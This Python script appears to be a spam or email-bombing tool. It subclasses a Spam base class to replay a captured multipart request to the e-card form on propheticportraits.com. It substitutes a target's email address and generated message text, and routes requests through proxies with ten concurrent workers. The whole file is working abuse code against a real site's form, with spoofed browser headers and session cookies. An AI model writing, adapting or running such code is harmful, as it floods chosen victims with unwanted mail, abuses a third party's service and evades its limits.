from os.path import basename

import requests

from module import Spam

cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fpropheticportraits.com%2Fecards%2F',
    '__stripe_mid': 'a754bfb2-c9cd-4e83-ad3c-3948be71bb9755c639',
    '__stripe_sid': '69112d43-da3d-4a42-ba61-3cfd73626745371b6f',
}

headers = {
    'authority': 'propheticportraits.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarySjTyoyEmarLc2IYc',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fpropheticportraits.com%2Fecards%2F; __stripe_mid=a754bfb2-c9cd-4e83-ad3c-3948be71bb9755c639; __stripe_sid=69112d43-da3d-4a42-ba61-3cfd73626745371b6f',
    'origin': 'https://propheticportraits.com',
    'referer': 'https://propheticportraits.com/ecards/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_img"\r\n\r\n1243\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_cust_image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_post"\r\n\r\n1242\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_unique_id"\r\n\r\n0\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_ajax_validated"\r\n\r\n1\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_action"\r\n\r\nprocess_from\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_name"\r\n\r\nname\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_femail"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_message"\r\n\r\ntest\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_schedule"\r\n\r\n\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc\r\nContent-Disposition: form-data; name="wp_iec_scopy"\r\n\r\n1\r\n------WebKitFormBoundarySjTyoyEmarLc2IYc--\r\n'

        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text(False))

        response = requests.post('https://propheticportraits.com/ecards/', cookies=cookies, headers=headers,
                                 data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    s = 'Your ecard was sent successfully.'

    spam = ConcreteSpam(basename(__file__)[:-3], s, target_pool_name='fkasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
